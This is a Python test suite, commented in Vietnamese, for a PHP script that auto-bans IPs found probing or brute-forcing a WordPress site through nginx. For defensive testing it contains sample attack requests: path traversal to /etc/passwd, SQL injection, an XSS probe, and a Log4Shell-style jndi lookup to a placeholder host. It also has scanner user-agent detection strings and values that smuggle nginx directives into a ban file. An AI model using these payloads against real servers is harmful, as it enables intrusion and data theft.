#!/usr/bin/env python3
"""Kiem thu security-guard.php (tu dong chan IP do quet/do mat khau - HANDOFF.md muc 1br) bang PHP CLI THAT tren log tong hop.
Khong can nginx/MariaDB/mang. Xem docs/SECURITY.md.

Trong tam (nhung dieu NGUY HIEM neu sai):
  1) KHONG BAO GIO chan IP loopback/LAN/CGNAT (khi nginx thieu module realip, moi khach cong khai la 127.0.0.1 -> chan la chan CA SITE);
  2) ban-list.conf chi chua dong DUNG CU PHAP (1 dong sai la nginx khong khoi dong duoc);
  3) crawler that / chu site da dang nhap khong tu khoa minh; 4) khong chan nham IP binh thuong chi vi vai 404;
  5) co chan duoc ke tan cong that: .env, readme plugin, brute-force wp-login, traversal ma hoa 2 lan, UA cong cu quet, IPv6 /64.
"""
import json, os, re, shutil, subprocess, sys, tempfile, time

HERE = os.path.dirname(os.path.abspath(__file__))
TPL = os.path.normpath(os.path.join(HERE, '..', 'runtimes', 'templates'))
GUARD = os.path.join(TPL, 'security-guard.php')
PASS = FAIL = 0


def check(name, cond, detail=''):
    global PASS, FAIL
    if cond:
        PASS += 1
        print('PASS: ' + name)
    else:
        FAIL += 1
        print('FAIL: ' + name + (('  -> ' + str(detail)[:300]) if detail else ''))


PHP_FLAGS = ['-d', 'display_errors=1', '-d', 'error_reporting=E_ALL', '-d', 'date.timezone=UTC']
DRIVER = r'''<?php
define("WPP_GUARD_AS_LIB", 1);
require $argv[1];
$cmd = $argv[2];
if ($cmd === "run") { echo json_encode(wpp_guard_run($argv[3], (int) $argv[4])); }
elseif ($cmd === "unban") { echo json_encode(wpp_guard_unban($argv[3], $argv[4], (int) $argv[5])); }
elseif ($cmd === "sanitize") { echo wpp_guard_sanitize_file($argv[3]); }
elseif ($cmd === "bans") { echo json_encode(wpp_guard_active_bans($argv[3], (int) $argv[4])); }
elseif ($cmd === "score") { echo json_encode(wpp_guard_score(json_decode($argv[3], true), $argv[4] === "1")); }
elseif ($cmd === "exempt") { echo json_encode(wpp_guard_ip_is_exempt($argv[3])); }
elseif ($cmd === "key") { echo wpp_guard_ban_key($argv[3]); }
elseif ($cmd === "geo") { echo json_encode(wpp_guard_geo_line($argv[3])); }
'''


class Env:
    def __init__(self):
        self.tmp = tempfile.mkdtemp(prefix='secguard-')
        self.run = os.path.join(self.tmp, 'lamp-run')
        os.makedirs(self.run)
        self.driver = os.path.join(self.tmp, 'driver.php')
        open(self.driver, 'w').write(DRIVER)
        self.log = os.path.join(self.run, 'nginx-security.log')
        self.t0 = 1_900_000_000          # moc thoi gian co dinh (log + now deu tinh theo day)

    def php(self, *args):
        r = subprocess.run(['php'] + PHP_FLAGS + [self.driver, GUARD] + [str(a) for a in args], capture_output=True, text=True)
        return r.stdout, r.stderr, r.returncode

    def runguard(self, now):
        out, err, rc = self.php('run', self.run, now)
        try:
            return json.loads(out), err
        except ValueError:
            return {'_raw': out, '_err': err, '_rc': rc}, err

    def write(self, lines, mode='a'):
        with open(self.log, mode, encoding='utf-8') as f:
            f.write(''.join(lines))

    @staticmethod
    def L(ts, ip, status, method, uri, ua='Mozilla/5.0'):
        return '%d.%03d %s %d %s "%s" "%s"\n' % (ts, 123, ip, status, method, uri, ua)

    def list_text(self):
        p = os.path.join(self.run, 'ban-list.conf')
        return open(p).read() if os.path.exists(p) else None

    def banned(self):
        t = self.list_text() or ''
        return [l.split()[0] for l in t.splitlines() if l and not l.startswith('#')]

    def state(self):
        return json.load(open(os.path.join(self.run, 'security-state.json')))

    def reset_flag(self):
        f = os.path.join(self.run, 'ban-reload')
        if os.path.exists(f):
            os.remove(f)

    def clean(self):
        shutil.rmtree(self.tmp, ignore_errors=True)


def main():
    if not shutil.which('php'):
        print('(bo qua: thieu php CLI)')
        return 0
    e = Env()
    try:
        t0 = e.t0
        L = e.L

        print('== 0. Hop dong dinh dang log voi nginx.conf.template ==')
        ngx = open(os.path.join(TPL, 'nginx.conf.template'), encoding='utf-8').read()
        m = re.search(r"log_format wp_pocket_sec (.*?);", ngx, re.S)
        fmt = ''.join(re.findall(r"'([^']*)'", m.group(1))) if m else ''
        check('log_format wp_pocket_sec dung thu tu truong guard doc (msec ip status method "uri" "ua")',
              fmt == '$msec $remote_addr $status $request_method "$request_uri" "$http_user_agent"', fmt)
        check('nginx ghi nginx-security.log voi dieu kien if=$wp_pocket_sec_log', re.search(r'access_log __RUNDIR__/nginx-security\.log wp_pocket_sec [^;]*if=\$wp_pocket_sec_log;', ngx) is not None)
        check('nginx co geo $wp_pocket_banned include __RUNDIR__/ban-list.conf va tra 444', 'include __RUNDIR__/ban-list.conf;' in ngx and re.search(r'if \(\$wp_pocket_banned\) \{\s*return 444;', ngx) is not None)

        print('== 1. Cham diem tung loai request ==')

        def score(uri, status=404, method='GET', ua='Mozilla/5.0', login=False):
            out, _, _ = e.php('score', json.dumps({'ts': t0, 'ip': '203.0.113.1', 'status': status, 'method': method, 'uri': uri, 'ua': ua}), '1' if login else '0')
            return json.loads(out)
        cases = [
            ('/.env', 404, 10, 'tep-nhay-cam'), ('/.git/config', 404, 10, 'tep-nhay-cam'), ('/wp-config.php.bak', 403, 10, 'tep-nhay-cam'),
            ('/wp-config.php~', 404, 10, 'tep-nhay-cam'), ('/backup.sql', 404, 10, 'tep-nhay-cam'), ('/phpmyadmin/', 404, 10, 'cong-cu-la'),
            ('/cgi-bin/luci', 404, 10, 'cong-cu-la'), ('/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 404, 10, None),
            ('/shell.php', 404, 10, 'web-shell'), ('/wp-content/uploads/c99.php', 404, 10, 'web-shell'),
            ('/index.php?page=../../../../etc/passwd', 404, 10, 'tiem-ma'), ('/?a=%252e%252e%252f%252e%252e%252fetc%252fpasswd', 404, 10, 'tiem-ma'),
            ('/?id=1%20UNION%20SELECT%201,2,3', 404, 10, 'tiem-ma'), ('/?q=%3Cscript%3Ealert(1)%3C/script%3E', 404, 10, 'tiem-ma'),
            ('/?x=${jndi:ldap://evil/a}', 404, 10, 'tiem-ma'),
            ('/wp-content/plugins/elementor/readme.txt', 404, 5, 'do-phien-ban'), ('/readme.html', 404, 5, 'do-phien-ban'),
            ('/wp-content/themes/twentyx/CHANGELOG.md', 404, 5, 'do-phien-ban'),
            ('/xmlrpc.php', 403, 5, 'xmlrpc'),
            ('/khong-co.php', 404, 3, 'php-khong-ton-tai'), ('/forbidden-dir/', 403, 2, 'bi-tu-choi-403'), ('/bai-viet-cu/', 404, 1, '404'),
            ('/wp-admin/admin-ajax.php', 403, 0.2, 'loi-4xx-wp'), ('/wp-json/wp/v2/posts/9999', 404, 0.2, 'loi-4xx-wp'),
        ]
        bad = []
        for uri, st, pts, kind in cases:
            got = score(uri, st)
            if abs(got[0] - pts) > 1e-9 or (kind and got[1] != kind):
                bad.append((uri, st, got, (pts, kind)))
        check('%d mau request duoc cham dung diem + dung nhom' % len(cases), not bad, bad[:3])
        # Cong URL dang nhap bi mat: nginx tra 404 cho /wp-login.php khi chua go cua - chu site quen go cua khong duoc tu khoa minh (truoc day 3 diem/lan = 4 lan la bi chan)
        check('GET /wp-login.php 404 (cong URL bi mat) = 1 diem nhom cong-dang-nhap-404 (khong phai php-khong-ton-tai 3 diem)', score('/wp-login.php', 404, 'GET') == [1.0, 'cong-dang-nhap-404'] and score('/wp-login.php?action=lostpassword', 404, 'GET')[1] == 'cong-dang-nhap-404')
        check('... 5 lan lien tiep tu 1 IP < nguong 10 (chu site quen go cua khong bi chan); chu site da dang nhap con 0.2 diem/lan; crawler tu nhan dien 0', 5 * score('/wp-login.php', 404, 'GET')[0] < 10 and abs(score('/wp-login.php', 404, 'GET', 'M', True)[0] - 0.2) < 1e-9 and score('/wp-login.php', 404, 'GET', 'Googlebot/2.1')[0] == 0)
        check('... nhung do wp-login.php bang UA cong cu quet van 10 diem; chi khop DUNG /wp-login.php (duong dan khac nhu /wp-login.php/x.php van la php-khong-ton-tai 3 diem)', score('/wp-login.php', 404, 'GET', 'WPScan v3')[0] == 10.0 and score('/wp-login.php/x.php', 404, 'GET') == [3.0, 'php-khong-ton-tai'])
        check('... 10 lan 404 /wp-login.php/10 phut (may do duong dan) dat nguong chan', 10 * score('/wp-login.php', 404, 'GET')[0] >= 10.0)
        check('POST wp-login.php that bai (200) = 2 diem; thanh cong (302) = 0 va danh dau dang-nhap-thanh-cong',
              score('/wp-login.php', 200, 'POST') == [2.0, 'do-mat-khau-wp'] and score('/wp-login.php', 302, 'POST') == [0.0, 'dang-nhap-thanh-cong'])
        check('GET wp-login.php (trang dang nhap, 200) KHONG tinh diem', score('/wp-login.php', 200, 'GET') == [0.0, ''])
        check('UA cong cu quet (sqlmap/nikto/wpscan/nuclei) = 10 ke ca tren trang vo hai', all(score('/', 200, 'GET', ua)[0] == 10.0 for ua in ('sqlmap/1.7', 'Nikto/2.5', 'WPScan v3', 'Nuclei - Open-source project')))
        check('Googlebot: 404/403/.php khong tru diem', score('/cu/', 404, 'GET', 'Mozilla/5.0 (compatible; Googlebot/2.1)')[0] == 0 and score('/x.php', 404, 'GET', 'Googlebot')[0] == 0 and score('/d/', 403, 'GET', 'bingbot')[0] == 0)
        check('... nhung Googlebot (UA co the gia) do .env van bi tinh 10 diem', score('/.env', 404, 'GET', 'Googlebot/2.1')[0] == 10.0)
        check('chu site da dang nhap WP: 404/403 chi con 20% diem; tan cong ro van du 10', abs(score('/a/', 404, 'GET', 'M', True)[0] - 0.2) < 1e-9 and abs(score('/x.php', 404, 'GET', 'M', True)[0] - 0.6) < 1e-9 and score('/.env', 404, 'GET', 'M', True)[0] == 10.0)
        check('request thanh cong binh thuong (200/301) khong tinh diem', score('/bai-viet/', 200)[0] == 0 and score('/', 301)[0] == 0)
        fp = [u for u in ('/', '/bai-viet-hay/', '/category/tin-tuc/', '/wp-content/uploads/2026/10/anh.jpg', '/san-pham/ao-thun/?color=red&size=m', '/tim-kiem/?s=php+tutorial',
                          '/wp-admin/post.php?post=5&action=edit', '/feed/', '/sitemap.xml', '/tag/c-programming/', '/blog/how-to-fix-environment-variables/', '/?s=union+of+two+sets')
              if score(u, 404)[0] > 1.0]
        check('URL binh thuong (ke ca co tu "env", "union", "php", "c-programming") KHONG bi cham >1 diem (khong chan nham)', not fp, fp)

        print('== 2. IP khong bao gio bi chan (an toan quan trong nhat) ==')
        exempt = ['127.0.0.1', '127.1.2.3', '10.0.0.5', '10.255.255.255', '192.168.1.9', '172.16.3.3', '172.31.9.9', '100.64.1.1', '100.127.255.254', '169.254.1.1',
                  '0.0.0.0', '224.0.0.1', '::1', '::', 'fe80::1', 'fd00::1234', 'fc00::1', 'ff02::1', '::ffff:10.0.0.1', '::ffff:127.0.0.1', 'khong-phai-ip', '999.1.1.1', '']
        notex = ['8.8.8.8', '203.0.113.7', '172.15.0.1', '172.32.0.1', '100.63.255.255', '100.128.0.1', '2001:db8::1', '2606:4700::1111', '::ffff:8.8.8.8']
        bad_e = [ip for ip in exempt if json.loads(e.php('exempt', ip)[0] or 'null') is not True]
        bad_n = [ip for ip in notex if json.loads(e.php('exempt', ip)[0] or 'null') is not False]
        check('moi dia chi loopback/LAN/CGNAT/link-local/ULA/khong hop le deu "exempt"', not bad_e, bad_e)
        check('dia chi cong khai (ke ca 172.15/172.32, 100.63/100.128 ngoai dai rieng) KHONG exempt', not bad_n, bad_n)
        e.write([L(t0 + i, ip, 404, 'GET', '/.env') for i, ip in enumerate(['127.0.0.1', '10.0.0.5', '192.168.1.9', '172.16.3.3', '100.64.1.1', '::1', 'fe80::1', 'fd00::1', '::ffff:127.0.0.1'])], 'w')
        r, err = e.runguard(t0 + 100)
        check('9 IP rieng/loopback do .env: KHONG ai bi chan, ban-list.conf khong co dong IP', e.banned() == [] and r.get('lines') == 9, (r, e.banned()))
        check('ban-list.conf duoc tao (rong, chi chu thich) - nginx geo include can file ton tai', e.list_text() is not None and e.list_text().startswith('#'), e.list_text())
        check('khong co canh bao/loi PHP', err.strip() == '' and '_raw' not in r, err)

        print('== 3. Chan ke tan cong that ==')
        e.reset_flag()
        e.write([L(t0 + 200, '203.0.113.7', 404, 'GET', '/.env')], 'w')
        e.state_offset = None
        r, err = e.runguard(t0 + 201)
        check('1 request /.env tu IP cong khai -> BI CHAN NGAY', e.banned() == ['203.0.113.7'], (r, e.list_text()))
        check('ban-list.conf dung cu phap nginx geo: "203.0.113.7 1;"', '203.0.113.7 1;\n' in (e.list_text() or ''), e.list_text())
        check('tao co ban-reload (start-lamp.sh se gui HUP cho nginx)', os.path.exists(os.path.join(e.run, 'ban-reload')))
        ev = open(os.path.join(e.run, 'security-events.log')).read() if os.path.exists(os.path.join(e.run, 'security-events.log')) else ''
        check('ghi su kien "ip=203.0.113.7 IP bi tu dong chan 1 gio" (dinh dang audit, Telegram doc duoc)', re.search(r'^\d{4}-\d\d-\d\d \d\d:\d\d:\d\d ip=203\.0\.113\.7 IP bi tu dong chan 1 gio \(lan thu 1, 10(?:\.0)? diem', ev) is not None, ev)

        e.reset_flag()
        r, _ = e.runguard(t0 + 202)
        check('chay lai khi khong co log moi: khong doi, khong tao lai co reload, khong ghi trung su kien', not os.path.exists(os.path.join(e.run, 'ban-reload')) and r.get('lines') == 0 and open(os.path.join(e.run, 'security-events.log')).read() == ev, r)

        # 404 thuong: 9 diem khong chan, 10 diem chan
        e.write([L(t0 + 300 + i, '198.51.100.5', 404, 'GET', '/trang-cu-%d/' % i) for i in range(9)])
        e.runguard(t0 + 320)
        check('9 lan 404 thuong trong 10 phut (9 diem) KHONG bi chan', '198.51.100.5' not in e.banned(), e.banned())
        e.write([L(t0 + 330, '198.51.100.5', 404, 'GET', '/trang-cu-9/')])
        e.runguard(t0 + 331)
        check('lan 404 thu 10 (du 10 diem) -> bi chan', '198.51.100.5' in e.banned(), e.banned())

        # Rai rac ngoai cua so
        e.write([L(t0 + 1000 + i * 700, '198.51.100.6', 404, 'GET', '/trang-%d/' % i) for i in range(30)])
        e.runguard(t0 + 1000 + 30 * 700)
        check('30 lan 404 nhung cach nhau 11+ phut (khong bao gio 10 diem trong 10 phut) KHONG bi chan', '198.51.100.6' not in e.banned(), e.banned())
        e.runguard(t0 + 1000)   # now cu khong lam gi hong

        # Brute-force wp-login
        e.write([L(t0 + 40000 + i, '198.51.100.20', 200, 'POST', '/wp-login.php') for i in range(4)])
        e.runguard(t0 + 40010)
        check('4 lan POST wp-login.php that bai (8 diem) chua chan', '198.51.100.20' not in e.banned())
        e.write([L(t0 + 40005, '198.51.100.20', 200, 'POST', '/wp-login.php')])
        e.runguard(t0 + 40011)
        check('lan thu 5 (10 diem) -> chan: do mat khau WordPress', '198.51.100.20' in e.banned(), e.banned())

        # Chu site da dang nhap
        e.write([L(t0 + 50000, '198.51.100.30', 200, 'POST', '/wp-login.php'), L(t0 + 50001, '198.51.100.30', 302, 'POST', '/wp-login.php')])
        e.write([L(t0 + 50010 + i, '198.51.100.30', 404, 'GET', '/phan-nao-do-%d/' % i) for i in range(30)])
        e.write([L(t0 + 50050 + i, '198.51.100.30', 403, 'POST', '/wp-admin/admin-ajax.php') for i in range(30)])
        e.runguard(t0 + 50100)
        check('chu site da dang nhap WP (302) + 30 404 + 30 admin-ajax 403: KHONG tu khoa minh', '198.51.100.30' not in e.banned(), e.banned())
        e.write([L(t0 + 50101, '198.51.100.30', 404, 'GET', '/.env')])
        e.runguard(t0 + 50102)
        check('DOI CHUNG: cung IP do .env van bi chan (dang nhap khong phai giay phep tan cong)', '198.51.100.30' in e.banned())
        e.write([L(t0 + 51000 + i, '198.51.100.31', 403, 'POST', '/wp-admin/admin-ajax.php') for i in range(30)])
        e.runguard(t0 + 51100)
        check('30 loi 403 admin-ajax tu IP khong dang nhap (6 diem) cung khong bi chan (khong du nguong)', '198.51.100.31' not in e.banned())

        # Do phien ban + xmlrpc
        e.write([L(t0 + 52000, '198.51.100.40', 404, 'GET', '/wp-content/plugins/elementor/readme.txt'), L(t0 + 52001, '198.51.100.40', 404, 'GET', '/wp-content/plugins/woocommerce/readme.txt')])
        e.write([L(t0 + 52002, '198.51.100.41', 403, 'POST', '/xmlrpc.php'), L(t0 + 52003, '198.51.100.41', 403, 'POST', '/xmlrpc.php')])
        e.runguard(t0 + 52010)
        check('do phien ban plugin qua readme.txt (2 lan) -> chan', '198.51.100.40' in e.banned(), e.banned())
        check('xmlrpc.php (da bi chan, van thu 2 lan) -> chan', '198.51.100.41' in e.banned(), e.banned())

        # Ma hoa 2 lop + UA cong cu
        e.write([L(t0 + 53000, '198.51.100.50', 404, 'GET', '/index.php?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd')])
        e.write([L(t0 + 53001, '198.51.100.51', 200, 'GET', '/', 'sqlmap/1.7.2#stable (https://sqlmap.org)')])
        e.runguard(t0 + 53010)
        check('duong dan ma hoa 2 lan (%252e%252e) van bi nhan ra la traversal -> chan', '198.51.100.50' in e.banned())
        check('UA sqlmap (ke ca khi request tra 200) -> chan', '198.51.100.51' in e.banned())

        # Crawler that
        e.write([L(t0 + 54000 + i, '66.249.66.1', 404, 'GET', '/bai-cu-%d/' % i, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)') for i in range(200)])
        e.runguard(t0 + 54300)
        check('Googlebot tu nhan dien: 200 lan 404 KHONG bi chan', '66.249.66.1' not in e.banned())

        # IPv6
        e.write([L(t0 + 55000, '2001:db8:aa:bb::5', 404, 'GET', '/.env')])
        e.runguard(t0 + 55010)
        check('IPv6 bi chan theo /64: "2001:db8:aa:bb::/64 1;"', '2001:db8:aa:bb::/64' in e.banned(), e.banned())
        e.write([L(t0 + 55100 + i, '2001:db8:cc:dd::%x' % (i + 1), 404, 'GET', '/trang-%d/' % i) for i in range(10)])
        e.runguard(t0 + 55200)
        check('ke tan cong doi dia chi trong CUNG /64 (10 dia chi khac nhau, moi cai 1 diem) van bi gom lai va chan', '2001:db8:cc:dd::/64' in e.banned(), e.banned())

        # Allowlist
        open(os.path.join(e.run, 'security-allow.txt'), 'w').write('# IP tin cay\n203.0.113.200\n198.18.0.0/15\n2001:db8:ee::/48\n')
        e.write([L(t0 + 56000 + i, ip, 404, 'GET', '/.env') for i, ip in enumerate(['203.0.113.200', '198.19.5.5', '2001:db8:ee:1::9', '203.0.113.201'])])
        e.runguard(t0 + 56100)
        b = e.banned()
        check('IP trong security-allow.txt (don, CIDR v4, CIDR v6) khong bao gio bi chan', '203.0.113.200' not in b and '198.19.5.5' not in b and not any(x.startswith('2001:db8:ee') for x in b), b)
        check('DOI CHUNG: IP ngay canh (203.0.113.201) khong nam trong allowlist -> van bi chan', '203.0.113.201' in b, b)

        print('== 4. Han chan tang dan + het han ==')
        e6 = Env()
        try:
            T = e6.t0
            L6 = e6.L
            e6.write([L6(T, '203.0.113.7', 404, 'GET', '/.env')], 'w')
            e6.runguard(T + 1)
            ban = e6.state()['bans']['203.0.113.7']
            check('lan 1: han chan = 1 gio', ban['until'] - ban['at'] == 3600 and ban['n'] == 1, ban)
            e6.reset_flag()
            e6.runguard(T + 1 + 3601)
            check('qua 1 gio: chan het han -> go khoi ban-list.conf va tao co reload', '203.0.113.7' not in e6.banned() and os.path.exists(os.path.join(e6.run, 'ban-reload')), e6.banned())
            e6.write([L6(T + 5000, '203.0.113.7', 404, 'GET', '/.git/config')])
            e6.runguard(T + 5010)
            ban2 = e6.state()['bans'].get('203.0.113.7', {})
            check('tai pham lan 2 -> han chan 24 gio', ban2.get('until', 0) - ban2.get('at', 0) == 86400 and ban2.get('n') == 2, ban2)
            e6.runguard(T + 5010 + 86401)
            e6.write([L6(T + 95000, '203.0.113.7', 404, 'GET', '/.env')])
            e6.runguard(T + 95010)
            ban3 = e6.state()['bans'].get('203.0.113.7', {})
            check('tai pham lan 3 -> han chan 7 ngay', ban3.get('until', 0) - ban3.get('at', 0) == 604800 and ban3.get('n') == 3, ban3)
            e6.runguard(T + 95010 + 604801)
            e6.write([L6(T + 800000, '203.0.113.7', 404, 'GET', '/.env')])
            e6.runguard(T + 800010)
            ban4 = e6.state()['bans'].get('203.0.113.7', {})
            check('tai pham lan 4 van o muc 7 ngay (khong tang vo han)', ban4.get('until', 0) - ban4.get('at', 0) == 604800 and ban4.get('n') == 4, ban4)
            # qua 30 ngay khong tai pham -> quen tien an
            e6.runguard(T + 800010 + 604801)
            e6.runguard(T + 800010 + 604801 + 2592001)
            check('sau 30 ngay khong tai pham: bo nho tien an bi xoa (khong giu mai trong state)', '203.0.113.7' not in e6.state()['offenses'], e6.state()['offenses'])
        finally:
            e6.clean()

        print('== 5. Do ben: log dang ghi do, bi cat, bi flood, dong rac ==')
        e2 = Env()
        try:
            T = e2.t0
            e2.write([L(T, '203.0.113.60', 404, 'GET', '/.env')[:-1]], 'w')       # chua co dau xuong dong
            r, _ = e2.runguard(T + 5)
            check('dong cuoi chua ket thuc bang \\n (nginx dang ghi do) KHONG duoc xu ly som', e2.banned() == [] and r.get('lines') == 0, (r, e2.banned()))
            e2.write(['\n'])
            r, _ = e2.runguard(T + 6)
            check('sau khi dong hoan tat thi duoc xu ly dung 1 lan', e2.banned() == ['203.0.113.60'] and r.get('lines') == 1, (r, e2.banned()))
            # log bi cat (xoay vong) -> doc lai tu dau
            e2.write([L(T + 100, '203.0.113.61', 404, 'GET', '/.env')], 'w')
            r, _ = e2.runguard(T + 110)
            check('log bi cat ngan hon offset (xoay vong) -> doc lai tu dau, khong bo sot', '203.0.113.61' in e2.banned(), (r, e2.banned()))
            # dong rac
            junk = ['', 'rac rac rac\n', '\x00\x01\x02\xff binary\n', 'x' * 5000 + '\n', '1900000000.1 1.2.3.4 abc GET "/" "ua"\n', '1900000000.1 ::: 404 GET "/.env" "ua"\n',
                    '1900000100.123 999.999.1.1 404 GET "/.env" "ua"\n', '1900000100.123 203.0.113.62 404 GET "/.env"\n']
            with open(e2.log, 'ab') as f:
                for j in junk:
                    f.write(j.encode('latin-1', 'replace'))
            r, err = e2.runguard(T + 200)
            check('dong rac/hong/IP khong hop le bi bo qua, khong Warning/Fatal, khong chan nham', err.strip() == '' and '_raw' not in r and '203.0.113.62' not in e2.banned(), (err[:200], r))
            check('ban-list.conf van chi chua dong hop le sau khi gap dong rac', all(re.match(r'^(?:#.*|(?:\d+\.\d+\.\d+\.\d+|[0-9a-f:]+/64) 1;)$', l) for l in (e2.list_text() or '').splitlines()), e2.list_text())
            # flood 3MB: chi xet 2MB cuoi, nhanh
            e2.write([L(T + 300, '203.0.113.70', 404, 'GET', '/.env')], 'w')
            e2.runguard(T + 301)
            filler = L(T + 400, '198.51.100.99', 200, 'POST', '/wp-login.php')
            big = ''.join(L(T + 400, '10.9.9.9', 404, 'GET', '/x-%d/' % i) for i in range(32000))   # ~3MB tu IP rieng (bi bo qua)
            e2.write([big, L(T + 900, '203.0.113.71', 404, 'GET', '/.env')])
            t_start = time.time()
            r, err = e2.runguard(T + 910)
            took = time.time() - t_start
            size = os.path.getsize(e2.log)
            check('flood %.1fMB: chay xong < 5 giay, khong loi (%.2fs)' % (size / 1e6, took), took < 5 and '_raw' not in r and err.strip() == '', (took, r, err[:100]))
            check('flood: ke tan cong o CUOI log van bi chan', '203.0.113.71' in e2.banned(), e2.banned())
        finally:
            e2.clean()

        print('== 6. ban-list.conf: cu phap + lam sach ==')
        e3 = Env()
        try:
            f = os.path.join(e3.run, 'ban-list.conf')
            open(f, 'w').write('# cu\n8.8.8.8 1;\n1.2.3.4 1\nevil; deny all;\n10.0.0.1 1;\n127.0.0.1 1;\n999.1.1.1 1;\n1.2.3.4/24 1;\n2001:db8:1:2::/64 1;\n2001:db8::1 1;\n'
                               'include /etc/passwd;\n8.8.4.4 1;\n::1 1;\n::/64 1;\n\n  9.9.9.9 1;  \n')
            out, err, rc = e3.php('sanitize', f)
            left = [l for l in open(f).read().splitlines()]
            check('sanitize giu 4 dong hop le (8.8.8.8, 2001:db8:1:2::/64, 8.8.4.4, 9.9.9.9) + chu thich, bo cac dong sai/nguy hiem', sorted(l for l in left if not l.startswith('#')) == sorted(['8.8.8.8 1;', '2001:db8:1:2::/64 1;', '8.8.4.4 1;', '9.9.9.9 1;']), left)
            check('sanitize bao so dong da bo (10)', out.strip() == '10', out)
            os.remove(f)
            e3.php('sanitize', f)
            check('file khong ton tai -> sanitize tao file RONG (geo include bat buoc co file)', os.path.exists(f) and open(f).read() == '', os.path.exists(f))
            # state bi bom doc: khong bao gio ra dong khong an toan
            json.dump({'v': 1, 'offset': 0, 'bans': {'1.2.3.4; deny all': {'until': e3.t0 + 9999, 'at': e3.t0, 'n': 1}, '10.1.1.1': {'until': e3.t0 + 9999, 'at': e3.t0, 'n': 1},
                       '9.9.9.9': {'until': e3.t0 + 9999, 'at': e3.t0, 'n': 1}, '2001:db8::5': {'until': e3.t0 + 9999, 'at': e3.t0, 'n': 1}}},
                      open(os.path.join(e3.run, 'security-state.json'), 'w'))
            e3.runguard(e3.t0)
            check('state bi sua tay/bom doc: chi dong an toan duoc ghi (khong co "deny all", khong IPv6 tran, van ghi 9.9.9.9 va 10.1.1.1 duoc coi la hop le cu phap)', 'deny' not in (e3.list_text() or '') and '9.9.9.9 1;' in (e3.list_text() or '') and '2001:db8::5' not in (e3.list_text() or ''), e3.list_text())
            for key, want in (('1.2.3.4', '"1.2.3.4 1;"'), ('2001:db8::/64', '"2001:db8::/64 1;"'), ('2001:db8::1', 'null'), ('1.2.3.4/24', 'null'), ('a;b', 'null'), ('', 'null')):
                got = json.dumps(json.loads(e3.php('geo', key)[0] or 'null'))
                if got != want:
                    check('geo_line(%r)' % key, False, got)
                    break
            else:
                check('geo_line chi sinh dong hop le (IPv4 don, IPv6 /64) va tu choi con lai', True)
            check('ban_key: IPv6 gom /64, IPv4-mapped thanh IPv4 (khong thanh ::/64 chan nham ::1)',
                  e3.php('key', '2001:db8:1:2:3:4:5:6')[0] == '2001:db8:1:2::/64' and e3.php('key', '::ffff:8.8.8.8')[0] == '8.8.8.8' and e3.php('key', '8.8.8.8')[0] == '8.8.8.8' and e3.php('key', 'rac')[0] == '')
        finally:
            e3.clean()

        print('== 7. Huy chan thu cong + khoa chay chong nhau ==')
        e4 = Env()
        try:
            T = e4.t0
            e4.write([L(T, '203.0.113.80', 404, 'GET', '/.env'), L(T, '2001:db8:9:9::1', 404, 'GET', '/.env')], 'w')
            e4.runguard(T + 1)
            check('co 2 chan (v4 + v6)', sorted(e4.banned()) == sorted(['203.0.113.80', '2001:db8:9:9::/64']), e4.banned())
            e4.reset_flag()
            out, _, _ = e4.php('unban', e4.run, '203.0.113.80', T + 2)
            check('unban tra true, go khoi ban-list.conf, tao co reload, giu chan con lai', out == 'true' and e4.banned() == ['2001:db8:9:9::/64'] and os.path.exists(os.path.join(e4.run, 'ban-reload')), (out, e4.banned()))
            out, _, _ = e4.php('unban', e4.run, '1.1.1.1', T + 3)
            check('unban IP khong co trong danh sach tra false (khong loi)', out == 'false')
            e4.write([L(T + 10, '203.0.113.80', 404, 'GET', '/.env')])
            e4.runguard(T + 11)
            check('sau khi huy, tai pham van duoc nho (lan do tinh la lan 1 moi: unban xoa luon bo nho tai pham)', e4.state()['bans']['203.0.113.80']['n'] == 1)
            # khoa: giu khoa o tien trinh khac, chay guard -> skipped
            holder = subprocess.Popen(['php', '-r', '$f=fopen($argv[1]."/security-guard.lock","c");flock($f,LOCK_EX);echo "L";fflush(STDOUT);sleep(6);', e4.run], stdout=subprocess.PIPE, text=True)
            holder.stdout.read(1)
            before = open(os.path.join(e4.run, 'security-state.json')).read()
            r, _ = e4.runguard(T + 20)
            check('co tien trinh khac dang giu khoa -> lan chay nay thoat im lang (skipped), khong doi state', r.get('skipped') is True and open(os.path.join(e4.run, 'security-state.json')).read() == before, r)
            holder.kill()
            holder.wait()
            r, _ = e4.runguard(T + 21)
            check('het khoa -> chay binh thuong', r.get('skipped') is False, r)
            open(os.path.join(e4.run, 'realip-missing'), 'w').write('1')
            e4.runguard(T + 22)
            status = json.load(open(os.path.join(e4.run, 'security-status.json')))
            check('security-status.json: realip_missing=true khi co co realip-missing; active_bans dem dung', status.get('realip_missing') is True and status.get('active_bans') == 2, status)
        finally:
            e4.clean()

        print('== 8. CLI that (php security-guard.php <rundir>) ==')
        e5 = Env()
        try:
            e5.write([L(int(time.time()) - 5, '203.0.113.90', 404, 'GET', '/.env')], 'w')
            r = subprocess.run(['php'] + PHP_FLAGS + [GUARD, e5.run], capture_output=True, text=True)
            check('CLI: thoat 0, in "chan moi: 203.0.113.90", ghi ban-list.conf', r.returncode == 0 and 'chan moi: 203.0.113.90' in r.stdout and e5.banned() == ['203.0.113.90'], (r.returncode, r.stdout, r.stderr[:100]))
            r = subprocess.run(['php'] + PHP_FLAGS + [GUARD, e5.run, 'sanitize'], capture_output=True, text=True)
            check('CLI sanitize: thoat 0', r.returncode == 0 and 'sanitize: loai bo 0' in r.stdout, r.stdout)
            r = subprocess.run(['php'] + PHP_FLAGS + [GUARD, os.path.join(e5.run, 'khong-co')], capture_output=True, text=True)
            check('CLI thieu thu muc -> thoat 2 + huong dan', r.returncode == 2 and 'dung:' in r.stderr, (r.returncode, r.stderr))
            r = subprocess.run(['php'] + PHP_FLAGS + ['-r', 'require $argv[1]; echo "ok";', GUARD], capture_output=True, text=True)
            check('nap nhu thu vien (khong qua CLI truc tiep) KHONG chay main, khong in gi them', r.stdout == 'ok' and r.returncode == 0, (r.stdout, r.stderr[:100]))
        finally:
            e5.clean()
    finally:
        e.clean()
    print('\nTONG KET: pass=%d fail=%d' % (PASS, FAIL))
    return 0 if FAIL == 0 else 1


if __name__ == '__main__':
    sys.exit(main())
